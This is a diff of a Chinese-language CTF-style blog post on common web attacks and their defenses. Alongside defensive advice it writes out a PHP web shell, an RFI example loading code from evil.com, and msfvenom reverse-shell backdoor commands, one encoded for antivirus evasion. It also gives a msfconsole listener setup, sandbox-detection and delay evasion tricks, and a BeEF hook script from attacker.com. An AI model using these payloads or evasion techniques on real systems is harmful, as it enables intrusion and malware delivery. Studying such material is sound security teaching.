@@ -1,95 +1,308 @@
 ---
 title: "Web Security"
 date: 2024-06-28T00:00:17+08:00
-draft: true
+draft: false
 description: "常見的 Web attack 和防禦方法"
 type: "post"
 tags: ["ctf", "security"]
 categories : ["ctf"]
 ---
 
-## File Uploaded Vulnerability
-### 防禦方法
-- 不要允許使用者上傳任何可執行的檔案
-- 檢查 file type 和 file extension
-  - file type 指的是 header 的 Content-Type
-- 用某些套件分析檔案，並重新創建和重新命名檔案
-
-## Code Execution Vulnerability
-- 允許攻擊者執行 OS command
-
-### 防禦方法
-- 不要使用危險的 function
-- 透過 filter 檢查輸入
-  - 比如利用 regex
-
-## File Inclusion Vulnerability
-### LFI (Local File Inclusion) Vulnerability
-- 攻擊者可以讀取伺服器上的任何檔案（包含 /var/www 外的檔案）
-- 透過輸入讀其他檔案的時候沒有檢查檔案路徑
-- 可以用來讀 /proc/self/environ，可能會存在一些可以透過 request 修改的變數。植入PHP 程式碼便有可能被執行
-
-### RFI (Remote File Inclusion) Vulnerability
-- 和 LFI 類似，但是檔案來自外部
-- 可以在當前 server 執行其他 server 的 php 程式碼
-- 可以在其他 server 以 .txt 存 php file
-
-### 防禦方法
-- 避免 remote file inclusion
-  - php 的話可以關掉 allow_url_fopen 和 allow_url_include
-- 避免 local file inclusion
-  - 用 static file inclusion，不要透過變數去取得檔案位置
-
 ## SQL Injection
-### 防禦方法
-- 使用 prepared statement
+- 描述：攻擊者透過將惡意 SQL 語句插入輸入欄位，使後端資料庫執行未預期的查詢。
+
+- 常見錯誤做法：
+  - 將用戶輸入直接拼接至 SQL 查詢字串。
+  - 忽略了登入、搜尋等功能的輸入驗證。
+
+- 防禦方法：
+  - 使用 預備語句（Prepared Statements）
+    - 資料庫不會把參數當作 SQL 語句的一部分，而是編譯完後再套用
+  - 使用 ORM（如 SQLAlchemy、Django ORM）
 
 ## XSS (Cross Site Scripting)
 - 允許攻擊者在網頁上執行 javascript code
 - 執行在 client 端，不是 server 端
-- Main types
-  - Reflected XSS
-    - 用 URL 攻擊
-  - Persistent/Stored XSS
-    - 攻擊的程式碼存在 database 或是某個 page
-  - DOM-based XSS
-    - 利用前面的方法，透過開發者不當操作 DOM 來攻擊
-    - ex: 攻擊者透過 .innerHTML 放入 script tag
+### 常見類型
 
-### Exploitation
-- BeEF Framework
-  - 可以把目標 hook 到 beef
-  - 可以透過 beef 對被 hook 的目標做各種操作
+#### Reflected XSS（反射型）
+- 利用 URL 傳參（如搜尋結果）注入 script。
+- 攻擊碼未儲存在伺服器，每次點擊連結才會觸發。
+- 攻擊範例：
+  ```
+  https://example.com/search?q=<script>alert(1)</script>
+  ```
+
+#### Stored XSS（儲存型）
+- 惡意腳本被儲存在伺服器（如留言板、文章內容）。
+- 所有瀏覽該頁的使用者都會中招。
+- ❗ 通常危害最大。
+
+#### DOM-based XSS
+- 發生在 JavaScript 對 DOM 操作時，未妥善處理使用者輸入。
+- 典型漏洞：
+  ```
+  document.body.innerHTML = location.search;
+  ```
+    - 
+### 防禦方法
+
+#### 輸出時進行 HTML Encoding（最基本防禦）
+- 將特殊字元轉為安全實體：
+  - `<` → `&lt;`
+  - `"` → `&quot;` …等
+- **只要資料要顯示到網頁，就要 encode！**
+
+#### 使用框架的自動防護機制
+- React、Angular、Vue 等現代框架預設對插入內容進行 escape。
+
+#### Content Security Policy（CSP）
+- 限制腳本來源，降低攻擊成功機會。
+- 範例：
+  ```
+  Content-Security-Policy: default-src 'self'; script-src 'self';
+  ```
+
+#### 避免動態寫入 innerHTML、document.write 等 API
+- 優先使用 `textContent` 或 `setAttribute` 等安全替代。
+
+## CSRF（Cross Site Request Forgery，跨站請求偽造）
+
+**描述**：攻擊者引導使用者瀏覽惡意網站，並在使用者已登入的情況下，自動對原本網站發送請求，造成非預期操作（如轉帳、刪除帳號）。
+
+**發生條件**：
+- 使用者已登入（例如 cookie 中有有效 session）。
+- 伺服器驗證只依賴 cookie，而沒有進一步驗證請求來源或內容真偽。
+
+---
 
 ### 防禦方法
-- 盡量避免讓 user 的輸入直接顯示在網頁上
-- 在 insert 到網頁前，escape 所有不信任的輸入
-  - 把這些 character 轉換成 HTML 用的格式
-    - ex: `<` -> `&lt;`
 
-## CSRF (Cross Site Request Forgery)
+#### Anti-CSRF Token（主流方法）
+- 每次產生表單時，伺服器也產生一個 **不可預測、短期有效** 的 token。
+- token 需與該使用者 session 綁定，並存於伺服器端（或 JWT claim）。
+- 前端送出 request 時，要同時提交這個 token（通常放在隱藏欄位或 header）。
+- 伺服器驗證 token 是否正確、是否過期、是否與 session 符合。
+
+```html
+<!-- HTML 表單中加入隱藏欄位 -->
+<input type="hidden" name="csrf_token" value="a1b2c3d4...">
+```
+
+#### SameSite Cookie 屬性（瀏覽器輔助防禦）
+- 在設定 session cookie 時加上 `SameSite=Strict` 或 `SameSite=Lax`：
+  
+```http
+Set-Cookie: sessionid=abc123; SameSite=Strict; HttpOnly; Secure
+```
+
+- 可防止瀏覽器在「跨站情境」中夾帶 cookie，自然也阻擋了 CSRF 攻擊。
+- 但是有可能發生某個 A 子網域有 XSS 漏洞，然後發給 B 子網域的情況
+
+#### 檢查 Referer / Origin Header（次要輔助）
+- 驗證 `Origin` 或 `Referer` 是否來自預期的網域，但會有兼容性或隱私問題。
+
+#### 前後端分離注意事項
+- 若採用 JWT 或 Token-based Auth，可將 CSRF token 傳在自定義 header 中，如：
+
+```http
+X-CSRF-Token: a1b2c3d4
+```
+
+- 記得 **後端禁止接受任意 CORS 請求來源**（設置嚴格的 `Access-Control-Allow-Origin`），避免 token 被惡意網站取得。
+
+## Command Injection (命令注入)
+**描述**：攻擊者將惡意系統命令注入後端指令執行語句中。
+
+**常見場景**：檔案壓縮、ping 指令、備份指令等功能。
+
+**防禦方法**：
+- 使用函式庫提供的安全方法（如 `subprocess.run()` 而非 `os.system()`）
+  - 避免字串拼接
+- 僅接受白名單參數
+  - 完整驗證與過濾使用者輸入
+
+## File Upload Vulnerability
+**描述**：攻擊者上傳惡意檔案（如 Web shell）並遠端執行。
+例如：上傳一個叫 shell.php 的檔案，裡面包含 <?php system($_GET['cmd']); ?>，攻擊者即可用網址執行任何系統指令：
+```bash
+http://example.com/uploads/shell.php?cmd=whoami
+```
+
+**防禦方法**：
+- 限制上傳檔案類型與大小
+- 不要允許使用者上傳任何可執行的檔案
+- 隨機重新命名上傳檔案並儲存在不可執行目錄（ex: /var/uploads 而不是 /var/www/html/uploads）
+
+## Clickjacking
+**描述**：攻擊者利用 iframe 誘使使用者點擊被覆蓋的元素（如「刪除帳號」）。
+
+**防禦方法**：
+- 使用 `X-Frame-Options: DENY` 或 `Content-Security-Policy: frame-ancestors 'none'`。
+  - 避免 iframe 嵌入網站
+- 在 UI 中增加視覺提示避免誤點
+  - 比如二次確認
+
+## Session Fixation / Session Hijacking
+**描述**：
+- Fixation：攻擊者先取得一個合法的 Session ID，讓給使用者，就能用相同 ID 竊取身分。
+- Hijacking：攻擊者竊取受害者的 Session ID。
+
+**防禦方法**：
+- 登入成功後 **重新產生 Session ID**
+- 禁止客戶端設定 Session ID
+- 使用者長時間不操作即強制登出（Session timeout）
+- 多裝置登入監控、異常地點登入提示
+
+
+## OS Command Injection
+**描述**：攻擊者將惡意的系統指令插入到伺服器執行的命令中，可能導致系統被入侵、資料外洩，嚴重時可導致遠端程式碼執行（RCE）。
+
+**常見場景**：
+- 系統提供 ping、zip、tar 等功能，將用戶輸入直接拼接進 shell 命令。
+- 使用 `os.system()`、`exec()`、`eval()` 等高風險函式處理輸入。
+
+**防禦方法**：
+- **避免使用高風險函式**：使用更安全的替代方法，如 Python 的 `subprocess.run()` 並以 list 方式傳入參數。
+- **使用正規表達式過濾輸入**：
+  - 例如只允許英數字：`^[a-zA-Z0-9]+$`
+- **執行環境隔離**：使用容器（如 Docker）隔離潛在受害服務。
+
+## File Inclusion Vulnerabilities
+攻擊者利用應用程式動態載入檔案的特性，來讀取、執行不該被存取的檔案，導致敏感資訊外洩甚至遠端程式碼執行（RCE）。
+### LFI（Local File Inclusion，本地檔案引入）
+**描述**：攻擊者可透過修改 URL 或參數，使伺服器載入本地的任意檔案，例如 `/etc/passwd`、Apache 設定檔、PHP session 資料等。
+
+**常見利用方式**：
+- 包含類似 `include($_GET['page'])` 的程式碼。
+- 搭配 `../../../../../etc/passwd` 進行目錄穿越（Directory Traversal）。
+
+### RFI（Remote File Inclusion，遠端檔案引入）
+**描述**：攻擊者可引入並執行來自遠端的程式碼（如 PHP 檔），達成遠端程式碼執行（RCE）。
+
+**常見利用方式**：
+- `include($_GET['url'])` 載入 `http://evil.com/shell.txt`，而檔案內容實際為 PHP 程式碼。
+
 ### 防禦方法
-- Anti CSRF token
-  - 生表單的時候也生一個 token，並記住，request 要帶上這個 token
-  - unpredictable
-  - can't be reused
-  - 前後端分離
-    - 後端生
-      - CORS 不要接受所有來源，讓前端取得 token
-    - 前端生
-      - 要發 request 的時候把 cookie 改成和 token 一樣的值
+- **嚴格限制可引入的檔案來源與名稱**（使用白名單設計）：
+  ```php
+  $allowed = ['about', 'contact'];
+  if (in_array($_GET['page'], $allowed)) {
+      include("pages/" . $_GET['page'] . ".php");
+  }
+  ```
+- 避免使用變數作為檔案名稱來源，改為靜態包含（static include）。
+- 關閉 PHP 設定中的遠端引入功能
+- 避免動態組合檔名，並過濾輸入：
+  - 防止目錄穿越：移除 ../ 或使用 realpath() 比對路徑範圍。
+  - 防止 null byte 攻擊（舊版本 PHP 用 %00 終止字串）。
+- 伺服器權限管理：
+  - 避免將敏感檔案與應用程式放在同一目錄。
+  - 執行帳號應無法讀寫非必要檔案。
 
 
-## Backdoor
-- msfvenom
-- msfconsole
 
-## Anti-Virus
-- Principle
-  - Static Analysis
-    - 和已知的 malware 比對
-    - 可以利用 packers, encoders, abfuscators 來讓程式更加獨特
-  - Dynamic(Heuristic) Analysis
-    - 在 sandbox 中執行，看他的行為
-    - 要幫程式增加安全的操作
-    - 延遲 Payload 執行的時間
+## Backdoor 建立工具
+### msfvenom
+**是什麼？**  
+Metasploit Framework 所提供的 payload 產生工具，可以產出能在目標系統執行的**惡意程式碼**（後門）。
+
+**用途：**
+- 建立可執行的 Payload，如：
+  - Windows：`.exe`
+  - Linux：`.elf`
+  - Android：`.apk`
+- 支援多種**連線方式**（payload type）：
+  - `reverse_tcp`：目標端主動連回攻擊者
+  - `bind_tcp`：目標端開一個 port 等攻擊者連線
+- 可加上 Encoder 混淆內容，避開簡單的防毒檢查
+**簡單範例：**
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe
+```
+產出一個 Windows 的反向連線後門程式 `backdoor.exe`，當執行後會主動回連給攻擊者。
+
+### msfconsole
+**是什麼？**  
+Metasploit 的主控制台，提供 CLI 介面來使用各種攻擊模組。
+
+**用途：**
+- 設定 **Listener**（聆聽端），等待後門回連（如上例的 reverse_tcp）
+- 使用 `exploit` 模組發送攻擊
+- 建立與受害主機的互動式 session（如 `meterpreter`）
+
+**簡單使用流程：**
+1. 啟動控制台：
+   ```bash
+   msfconsole
+   ```
+2. 載入 handler 模組（接收反向連線）：
+   ```bash
+   use exploit/multi/handler
+   set payload windows/meterpreter/reverse_tcp
+   set LHOST 192.168.1.100
+   set LPORT 4444
+   run
+   ```
+3. 等待 `backdoor.exe` 被目標執行 → 自動建立 session
+
+### Anti-Virus Evasion（規避防毒軟體）
+**目的**：讓惡意程式（如後門）**避開防毒軟體偵測**，成功在受害者系統上執行。  
+現代防毒使用靜態與動態分析來識別惡意程式，因此攻擊者會針對這兩類技術進行規避。
+
+#### 原理
+##### Static Analysis（靜態分析）
+**分析方式**：
+- 防毒會掃描**檔案的內容**，比對是否與已知病毒碼（signature）或結構特徵相符。
+- 不需執行程式，只從檔案本身判斷。
+
+**規避手法**：
+
+| 技術 | 說明 |
+|------|------|
+| Packers | 使用壓縮/加殼工具（如 UPX）將程式包裹起來，改變 payload 的 signature |
+| Encoders | 編碼 payload，例如用 XOR、base64 等變形 |
+| Obfuscators | 程式碼混淆，加入亂數變數名稱、無用指令或是做其他等效轉換等等 |
+| Binary Padding | 人為插入 junk bytes，讓 hash 改變、外觀與特徵不同，或是靠過大的檔案突破檢測限制 |
+
+**範例（使用 msfvenom 加 encoders）：**
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > evaded.exe
+```
+- `-e`：指定 encoder
+- `-i 5`：多次重複編碼（提高變異性）
+
+##### Dynamic / Heuristic Analysis（動態 / 啟發式分析）
+
+**分析方式**：
+- 在安全環境（sandbox）執行程式，觀察其行為（如改 registry、建立連線、修改檔案等）。
+- 若行為類似惡意軟體，即使內容不相同，也會被標示為威脅。
+
+**規避手法**：
+
+| 技術 | 說明 |
+|------|------|
+| 延遲執行 | 程式先 sleep 30 秒後才觸發惡意行為，躲過短時間沙盒分析 |
+| 引導正常行為 | 先開啟記事本、瀏覽器等合法操作掩蓋真正目的 |
+| 沙盒檢測 | 判斷系統是否為虛擬機／分析環境（例如偵測硬碟名稱、MAC、RAM 小於某值）來決定是否執行 |
+
+## Exploitation Framework：BeEF（Browser Exploitation Framework）
+
+### BeEF 是什麼？
+BeEF 是一套專門用來**攻擊瀏覽器**的滲透測試框架，名字來自 **Browser Exploitation Framework**。  
+它讓你可以透過 XSS 等漏洞，將受害者的瀏覽器「hook」進你的控制中心，並執行各種針對性的操作。
+
+---
+
+### 攻擊流程簡介
+
+1. **注入 hook.js**：
+   - 攻擊者設法讓目標載入 BeEF 的 JavaScript hook（通常透過 XSS）。
+   - 範例注入碼：
+     ```html
+     <script src="http://attacker.com/hook.js"></script>
+     ```
+
+2. **瀏覽器被 hook 後**：
+   - 會定期向 BeEF 控制中心送出心跳請求，成為一個 hooked client。
+   - 攻擊者就能透過介面操作該瀏覽器。
